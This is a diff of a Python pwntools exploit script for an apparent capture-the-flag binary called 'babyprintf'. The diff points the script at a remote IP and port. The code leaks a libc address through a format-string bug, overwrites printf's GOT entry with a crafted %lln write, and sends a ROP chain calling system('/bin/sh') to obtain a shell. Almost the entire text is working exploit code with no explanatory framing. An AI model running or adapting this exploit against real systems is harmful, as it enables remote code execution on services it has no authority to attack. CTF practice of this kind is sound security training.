@@ -1,7 +1,7 @@
 #-*- encoding: utf-8 -*- 
 from pwn import *
 context.binary = './babyprintf'
-context.log_level = 'debug'
+#context.log_level = 'debug'
 context.timeout = None
 elf = context.binary
 libc = elf.libc
@@ -34,8 +34,8 @@ def fmt_str(offset, size, addr, target):
         prev = (target >> i * 8) & 0xff
     return payload
 
-p = process('./babyprintf')
-#p = remote('183.129.189.60', 10043)
+#p = process('./babyprintf')
+p = remote('183.129.189.60', 10043)
 
 #leak libc
 payload = '%43$p'
@@ -43,25 +43,32 @@ p.sendline(payload)
 libc_start_main_addr = int(p.recvline().strip('\n'), 16) - 240
 libc.address = libc_start_main_addr - libc.symbols['__libc_start_main']
 system = libc.symbols['system']
-#binsh = next(libc.search('/bin/sh\x00'))
+binsh = next(libc.search('/bin/sh\x00'))
 print "libc.address ==> " + hex(libc.address)
 print "system ==> " + hex(system)
-gadget = libc.address + 0xf1147
-#write fgets_got to system
 
-gdb.attach(p, 'b* 0x4006DA')
-dbg()
-fgets_got = elf.got['fgets']
+#gdb.attach(p, 'b* 0x4006DA')
+#dbg()
+printf_got = elf.got['printf']
+
+printf_plt = 0x4004F0
+pops_addr = 0x40074C
 
 #null 截断手动构造
-byte_4 = gadget & 0xffffffff
-print "byte_4 ==> " + hex(byte_4)
+bytes = pops_addr & 0xffffff
 
-payload =  '%%%dc' % (byte_4)
-payload += '%%%d$n' % (8 + 3)
+payload =  '%%%dc' % (bytes)
+payload += '%%%d$lln' % (8 + 3)
 payload = payload.ljust(0x18, 'a')
-payload += p64(fgets_got)
+payload += p64(printf_got)
 
+p.sendline(payload)
+
+pop_rdi = 0x400753 # pop rdi ; ret
+payload = 'a'*8
+payload += p64(pop_rdi)
+payload += p64(binsh)
+payload += p64(system)
 
 p.sendline(payload)
 
